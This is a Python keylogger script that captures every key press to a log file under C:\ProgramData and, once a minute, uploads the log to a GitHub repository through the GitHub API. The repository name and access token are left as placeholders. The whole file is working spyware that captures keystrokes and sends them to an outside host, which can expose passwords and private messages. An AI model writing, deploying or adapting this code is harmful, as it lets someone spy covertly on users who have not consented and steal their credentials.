import base64
import datetime
import getpass
import os
from datetime import datetime

import keyboard
import requests

# Set the folder and log file paths for storing the captured keyboard events
FOLDER_PATH = "C:\\ProgramData\\Key"
LOG_FILE_PATH = os.path.join(FOLDER_PATH, "log.txt")

# Get the current minute as the starting point for the periodic upload to GitHub
LAST_MINUTE = datetime.now().minute

# Create the folder if it doesn't exist
if not os.path.exists(FOLDER_PATH):
    os.makedirs(FOLDER_PATH)


# Define a function to upload the log file to GitHub
def upload_to_github():
    # Create a unique file name based on the current date and time, username, and PC name
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    username = getpass.getuser()
    upload_file = f"{current_time}_{username}.txt"

    # Set the URL for the GitHub repository and the file path for the log file
    url = "https://api.github.com/repos/<github_name>/<repository_name>/contents/" + upload_file
    file_path = 'C:\\ProgramData\\Key\\log.txt'

    # Encode the log file content using base64 encoding
    with open(file_path, "rb") as file:
        content = file.read()
    content_encoded = base64.b64encode(content).decode("utf-8")

    # Set the JSON payload for the GitHub API call
    payload = {
        "message": "Your commit message here",
        "content": content_encoded,
        "branch": "main",
        "path": file_path
    }

    # Set the authorization token for the GitHub API call
    # Note: the rights to upload files must be activated and a personal access token must be used
    access_token = ""
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Send a PUT request to the GitHub API to upload the log file
    response = requests.put(url, json=payload, headers=headers)

    # Check the status code of the response and print a message indicating success or failure
    if response.status_code == 201:
        print('File uploaded successfully')
    else:
        print('Error uploading file:', response.json)


# Open the log file in append mode and start capturing keyboard events
with open(LOG_FILE_PATH, "a") as log_file:
    while True:
        event = keyboard.read_event()

        # If a key is pressed, write the event information to the log file
        if event.event_type == "down":
            now = datetime.now()
            log_file.write(f"[{now.strftime('%Y-%m-%d %H:%M:%S')}] {event.name}\n")
            log_file.flush()

        # Check if a new minute has started and trigger the periodic upload to GitHub
        currentMinute = datetime.now().minute
        if currentMinute != LAST_MINUTE:
            LAST_MINUTE = currentMinute
            print("Start upload...")
            upload_to_github()
